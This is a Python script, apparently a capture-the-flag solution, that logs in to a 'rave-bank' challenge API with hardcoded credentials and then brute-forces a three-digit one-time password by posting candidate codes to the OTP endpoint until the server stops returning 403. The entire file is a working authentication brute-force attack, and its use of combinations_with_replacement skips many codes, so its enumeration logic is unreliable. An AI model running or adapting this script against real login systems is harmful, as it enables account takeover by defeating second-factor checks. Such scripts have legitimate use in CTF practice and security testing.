import requests
import string
import itertools

sess = requests.Session()

headers = {
    'Content-Type': 'application/json',
}

token = sess.post('http://rave-bank.level-up.2020.tasks.cyberchallenge.ru/api/auth/sign-in',
                headers = headers, 
                data='{"username":"crabster", "password":"b0a3eaa4"}',
                verify=False)
real_token = token.json()["data"]["otpToken"]

data = '{{"otpToken":"{token}", "otp":"{0}"}}'
ascii_lp = string.digits

for i in itertools.combinations_with_replacement(ascii_lp, 3):
    d = data.format("".join(i), token = real_token)
    req_send = sess.post('http://rave-bank.level-up.2020.tasks.cyberchallenge.ru/api/auth/otp',
                            headers=headers,
                            data=d,
                            verify=False)
    if req_send.status_code != 403:
        print(f"Found part of OTP token, {d}, {req_send.text}, {req_send.status_code}, {req_send.headers}")
        break
    print(f"Checked: {''.join(i)}", end="\r")